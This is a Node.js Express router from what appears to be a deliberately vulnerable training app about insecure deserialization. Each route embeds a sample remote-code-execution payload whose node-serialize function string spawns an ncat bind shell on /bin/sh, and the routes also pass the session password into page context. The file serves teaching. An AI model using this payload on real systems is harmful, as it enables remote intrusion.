module.exports = function() {
	var express = require("express")
	var router = express.Router()
	var handlebars = require("express-handlebars")
	var serialize = require("serialize-javascript");
	const v8 = require('v8');

	router.get("/", (req,res) => {
		var context = {
			header: "> Using Components with Known Vulnerabilites",
			usingComponentsWithKnownVulnerabilities: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			benign: "{test:123}",
			test: `{"data":[255,13,34,10,123,116,101,115,116,58,49,50,51,125]}`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			password: req.session.password
		}
		res.render("usingComponentsWithKnownVulnerabilities",context)
		console.log("Using Components with Known Vulnerabilites loaded!")

		// Saves current path for light/dark theme redirect
		req.session.previousPath = req.originalUrl
	})

	router.post("/deserialize", (req,res) => {
		var context = {
			header: "> Using Components with Known Vulnerabilites",
			usingComponentsWithKnownVulnerabilities: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			benign: "{test:123}",
			test: `{"data":[255,13,34,10,123,116,101,115,116,58,49,50,51,125]}`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			password: req.session.password
		}
		try{
			var obj = Buffer.from(JSON.parse(req.body.userInput).data);
			console.log(obj.toString('utf8'));
			var deserialized = obj.toString('utf8');
			context.deserialized = deserialized;
		}catch(error){
			context.error = error;
		}
		res.render("usingComponentsWithKnownVulnerabilities",context)
		console.log("Using Components with Known Vulnerabilites loaded!")
	})

	router.post("/serialize", (req,res) => {
		var context = {
			header: "> Using Components with Known Vulnerabilites",
			usingComponentsWithKnownVulnerabilities: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			benign: "{test:123}",
			test: `{"data":[255,13,34,10,123,116,101,115,116,58,49,50,51,125]}`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			password: req.session.password
		}
		var obj = req.body.userInput;
		var serialized = v8.serialize(obj);
		var json = JSON.stringify(serialized);
		console.log(json);
		context.serialized = json;
		res.render("usingComponentsWithKnownVulnerabilities",context)
		console.log("Using Components with Known Vulnerabilites loaded!")
	})

	return router
}();
